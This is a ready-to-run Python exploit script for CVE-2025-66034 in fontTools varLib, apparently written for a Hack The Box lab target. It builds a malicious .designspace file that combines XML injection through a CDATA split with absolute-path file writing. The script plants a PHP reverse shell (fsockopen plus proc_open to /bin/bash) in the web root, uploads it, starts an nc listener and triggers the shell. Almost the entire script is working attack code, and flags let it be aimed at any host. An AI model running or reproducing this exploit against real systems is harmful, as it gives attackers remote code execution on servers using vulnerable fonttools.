#!/usr/bin/env python3
"""
=============================================================================
  font_varlib.py — CVE-2025-66034
  fontTools varLib Arbitrary File Write + XML Injection → RCE

  Vulnerability : fonttools >= 4.33.0, < 4.60.2
  Component     : fontTools.varLib.__init__.py
  Class         : Path Traversal (CWE-22) + XML Injection (CWE-91)
  Impact        : Arbitrary file write → webshell → RCE

  Usage : python3 font_varlib.py --ip <IP> --port <PORT>
=============================================================================
"""

import argparse
import logging
import secrets
import string
import subprocess
import sys
import time

import requests

from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

# ══════════════════════════════════════════════════════════════════════════════
#  DEFAULTS
#  Change these to match your target before running.
#  All values can also be overridden at runtime via CLI flags — see --help.
# ══════════════════════════════════════════════════════════════════════════════

# Base URL of the upload host (the site that accepts the .designspace)
UPLOAD_HOST = "http://variatype.htb"

# Path on the upload host that processes the multipart form POST
# Confirm with Burp — look for the POST after clicking "Generate Variable Font"
UPLOAD_ENDPOINT = "/tools/variable-font-generator/process"

# Absolute filesystem path on the server where output files are written
# Must be web-accessible so the shell can be triggered via HTTP
# Common alternatives:
#   /var/www/html/files
#   /var/www/<hostname>/public/files
#   /opt/app/public/uploads
WEBROOT = "/var/www/portal.variatype.htb/public/files"

# Base URL used to fetch/trigger the written shell file
# Maps to WEBROOT on disk — if WEBROOT = /var/www/html/files
# then SHELL_HOST = http://target.htb/files
SHELL_HOST = "http://portal.variatype.htb/files"

# Multipart form field names — confirm with Burp before running
# If upload silently fails (HTTP 200 but no shell), wrong field names are likely the cause
FIELD_DESIGNSPACE = "designspace"  # field name for the .designspace file
FIELD_MASTERS = "masters"  # field name for .ttf font files (sent twice)

# Shell filename prefix — a random suffix is appended at runtime
# Change to something less obvious if needed e.g. "img_", "asset_", "tmp_"
SHELL_PREFIX = "f0nt_"

# Length of the random suffix appended to the shell filename
# Longer = harder to guess if directory listing is off
SHELL_SUFFIX_LEN = 8

# ══════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════════════════════════════

logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger("font_varlib")


def info(msg):
    log.info(f"  [*] {msg}")


def ok(msg):
    log.info(f"  [+] {msg}")


def warn(msg):
    log.warning(f"  [!] {msg}")


def fail(msg):
    log.error(f"  [-] {msg}")


def section(t):
    log.info(f"\n{'─' * 58}")
    log.info(f"  {t}")
    log.info(f"{'─' * 58}")


# ══════════════════════════════════════════════════════════════════════════════
#  ARGS
# ══════════════════════════════════════════════════════════════════════════════


def parse_args():
    p = argparse.ArgumentParser(
        prog="font_varlib",
        description="CVE-2025-66034 | fontTools varLib → RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python3 font_varlib.py --ip 10.10.14.5 --port 4444
  python3 font_varlib.py --ip 10.10.14.5 --port 4444 --no-listen
  python3 font_varlib.py --ip 10.10.14.5 --port 4444 \\
      --upload http://target.htb/tools/variable-font-generator/process \\
      --webroot /var/www/html/files \\
      --shell http://target.htb/files
        """,
    )

    p.add_argument("--ip", required=True, help="Attacker listener IP")
    p.add_argument("--port", required=True, type=int, help="Attacker listener port")
    p.add_argument(
        "--upload",
        default=f"{UPLOAD_HOST}{UPLOAD_ENDPOINT}",
        help="Upload endpoint (POST)",
    )
    p.add_argument(
        "--webroot", default=WEBROOT, help="Server-side filesystem write path"
    )
    p.add_argument("--shell", default=SHELL_HOST, help="Base URL where shell is served")
    p.add_argument("--no-listen", action="store_true", help="Skip auto nc listener")

    return p.parse_args()


# ══════════════════════════════════════════════════════════════════════════════
#  BANNER
# ══════════════════════════════════════════════════════════════════════════════


def banner(args):
    print(f"""
╔═══════════════════════════════════════════════════════════╗
║   font_varlib  //  CVE-2025-66034                        ║
║   fontTools varLib  →  Arbitrary Write  →  RCE           ║
╠═══════════════════════════════════════════════════════════╣
║   attacker  {args.ip + ':' + str(args.port):<46} ║
║   upload    {args.upload:<46} ║
║   webroot   {args.webroot:<46} ║
║   shell     {args.shell:<46} ║
╚═══════════════════════════════════════════════════════════╝""")


# ══════════════════════════════════════════════════════════════════════════════
#  FONT FACTORY
# ══════════════════════════════════════════════════════════════════════════════


def build_source_font(filepath, weight):
    """
    Minimal valid TTF — varLib needs two axis masters to run.
    Generated locally so no real fonts needed before exploit.
    """
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})

    # Simple square glyph — varLib only needs valid outline data to process
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()

    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)  # 100=Light, 400=Regular
    fb.setupPost()
    fb.setupNameTable({"familyName": "PwnFont", "styleName": f"W{weight}"})
    fb.save(filepath)


def make_fonts():
    section("GENERATING MASTER FONTS")
    # Generate both axis masters — varLib requires at least two sources
    build_source_font("source-light.ttf", weight=100)
    build_source_font("source-regular.ttf", weight=400)
    ok("source-light.ttf   (w100)")
    ok("source-regular.ttf (w400)")


# ══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD BUILDERS
# ══════════════════════════════════════════════════════════════════════════════


def make_shell_name():
    """
    Generates a randomized .php filename using prefix + suffix from config.
    Change SHELL_PREFIX and SHELL_SUFFIX_LEN at the top to customize.
    [a-z0-9] only — safe for URLs and curl one-liners.
    """
    charset = string.ascii_lowercase + string.digits
    rand = "".join(secrets.choice(charset) for _ in range(SHELL_SUFFIX_LEN))
    return f"{SHELL_PREFIX}{rand}.php"


def build_reverse_shell_php(ip, port):
    """
    PHP reverse shell via fsockopen + proc_open.
    No curl/wget/python needed on target — just PHP + /bin/bash.
    Change ip/port at runtime via --ip and --port flags.
    """
    return (
        f"<?php "
        f'$s=fsockopen("{ip}",{port});'
        f"$d=array(0=>$s,1=>$s,2=>$s);"
        f'proc_open("/bin/bash -i",$d,$p);'
        f"?>"
    )


def build_exploit_designspace(php_payload, write_path):
    """
    Malicious .designspace chaining both CVE-2025-66034 primitives:

    PRIMITIVE 1 — XML Injection (CWE-91) via CDATA split:
      ]]]]><![CDATA[> closes the current CDATA block and opens a new one.
      XML parser sees valid markup — written file contains raw PHP.
      Confirmed working format from Burp:
        <![CDATA[CODE]]]]><![CDATA[>]]>

    PRIMITIVE 2 — Path Traversal (CWE-22) via filename attribute:
      varLib: os.path.join(output_dir, filename) — no sanitization.
      Absolute path → output_dir discarded → write anywhere writable.
    """
    return f"""<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
    <axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <!-- XML INJECTION: CDATA split embeds PHP into output file -->
            <labelname xml:lang="en"><![CDATA[{php_payload}]]]]><![CDATA[>]]></labelname>
            <labelname xml:lang="fr">PENTEST</labelname>
        </axis>
    </axes>
    <sources>
        <!-- Filenames must exactly match the uploaded masters -->
        <source filename="source-light.ttf" name="Light">
            <location><dimension name="Weight" xvalue="100"/></location>
        </source>
        <source filename="source-regular.ttf" name="Regular">
            <location><dimension name="Weight" xvalue="400"/></location>
        </source>
    </sources>
    <variable-fonts>
        <!-- PATH TRAVERSAL: absolute path bypasses output_dir in os.path.join() -->
        <variable-font name="MaliciousFont" filename="{write_path}">
            <axis-subsets><axis-subset name="Weight"/></axis-subsets>
        </variable-font>
    </variable-fonts>
</designspace>"""


# ══════════════════════════════════════════════════════════════════════════════
#  UPLOADER
# ══════════════════════════════════════════════════════════════════════════════


def upload(xml_payload, endpoint):
    """
    Multipart POST to the font generation endpoint.
    Field names come from FIELD_DESIGNSPACE and FIELD_MASTERS in config.
    If upload succeeds (HTTP 200) but no shell appears, wrong field names
    are the most likely cause — confirm with Burp and update config.
    """
    files = [
        # FIELD_DESIGNSPACE — the malicious .designspace file
        (
            FIELD_DESIGNSPACE,
            ("malicious.designspace", xml_payload, "application/octet-stream"),
        ),
        # FIELD_MASTERS — two .ttf files under the same field name (confirmed from Burp)
        # Order: regular first, then light — matches confirmed working request
        (
            FIELD_MASTERS,
            ("source-regular.ttf", open("source-regular.ttf", "rb"), "font/ttf"),
        ),
        (
            FIELD_MASTERS,
            ("source-light.ttf", open("source-light.ttf", "rb"), "font/ttf"),
        ),
    ]

    # Headers mirrored from confirmed working Burp request
    # Update Origin/Referer if UPLOAD_HOST changes
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": UPLOAD_HOST,
        "Referer": f"{UPLOAD_HOST}/tools/variable-font-generator",
        "Upgrade-Insecure-Requests": "1",
    }

    return requests.post(
        endpoint, files=files, headers=headers, timeout=20, allow_redirects=True
    )


# ══════════════════════════════════════════════════════════════════════════════
#  EXPLOIT
# ══════════════════════════════════════════════════════════════════════════════


def run_exploit(args):

    # Port sanity checks
    if not (1 <= args.port <= 65535):
        sys.exit("[-] Invalid port")
    if args.port > 10000:
        warn("Ports > 10000 may be blocked. Consider 4444, 9001, 5050.")
    elif args.port < 1024:
        warn("Ports < 1024 require root to bind.")

    # Step 1 — generate master fonts locally
    make_fonts()

    # Step 2 — build randomized shell name and derive paths
    shell_name = make_shell_name()
    # write_path : where varLib writes the file on disk (path traversal target)
    write_path = f"{args.webroot}/{shell_name}"
    # trigger_url: HTTP URL to execute the written PHP shell
    trigger_url = f"{args.shell}/{shell_name}"

    section("PAYLOAD")
    info(f"Shell name  : {shell_name}")
    info(f"Write path  : {write_path}")
    info(f"Trigger URL : {trigger_url}")

    # Step 3 — craft malicious .designspace with both CVE primitives
    php = build_reverse_shell_php(args.ip, args.port)
    xml = build_exploit_designspace(php, write_path)
    ok("malicious.designspace crafted")
    info("Primitive 1 : CDATA split  →  PHP injected into output body")
    info("Primitive 2 : Absolute path  →  output_dir bypassed in os.path.join()")

    # Step 4 — upload to target
    section("UPLOADING")
    r = upload(xml, args.upload)
    ok(f"Server response: HTTP {r.status_code}")

    # Step 5 — start listener and trigger the shell
    section("LISTENER  //  TRIGGER")

    if not args.no_listen:
        info(f"Spawning nc -lvnp {args.port} ...")
        try:
            proc = subprocess.Popen(
                ["nc", "-lvnp", str(args.port)],
                stdin=None,
                stdout=None,
                stderr=subprocess.DEVNULL,
            )
            # Wait for nc to bind before sending the trigger request
            time.sleep(2)

            info(f"Triggering: {trigger_url}")
            try:
                requests.get(trigger_url, timeout=5)
            except requests.exceptions.Timeout:
                # Timeout on trigger = shell connected back = success
                ok("Timeout on trigger  →  shell connected to listener")
            except requests.RequestException as e:
                warn(f"Trigger error — run manually:")
                warn(f"  curl '{trigger_url}'")

            # Block until shell session exits or Ctrl+C
            proc.wait()

        except KeyboardInterrupt:
            ok("Session ended")

    else:
        # --no-listen: user handles nc manually
        info("--no-listen set. Start listener manually:")
        info(f"  nc -lvnp {args.port}")
        time.sleep(1)
        info(f"Triggering: {trigger_url}")
        try:
            requests.get(trigger_url, timeout=5)
        except requests.exceptions.Timeout:
            # Timeout = shell dialed back successfully
            ok("Timeout  →  shell likely active on your listener")
        except requests.RequestException as e:
            warn(f"Trigger failed — manually run:")
            warn(f"  curl '{trigger_url}'")

    print()


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════


def main():
    args = parse_args()
    banner(args)
    run_exploit(args)


if __name__ == "__main__":
    main()
